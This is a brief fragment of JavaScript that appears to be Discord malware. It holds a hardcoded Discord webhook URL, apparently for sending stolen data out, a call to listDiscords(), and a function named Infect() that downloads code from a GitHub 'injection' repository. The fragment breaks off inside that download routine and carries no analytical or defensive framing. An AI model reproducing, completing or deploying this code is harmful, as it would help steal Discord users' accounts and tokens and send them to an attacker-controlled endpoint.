...
const webhook = "https://canary.discord.com/api/webhooks/934893362715168809/2b2YO6vbtfD9XLLgWNgABnzghdXlrbCz8ItIrCo63Hk080Ea2_WClNbZW3hsYO8txHUC"
...
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/youngvalak/injection/main/clean', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
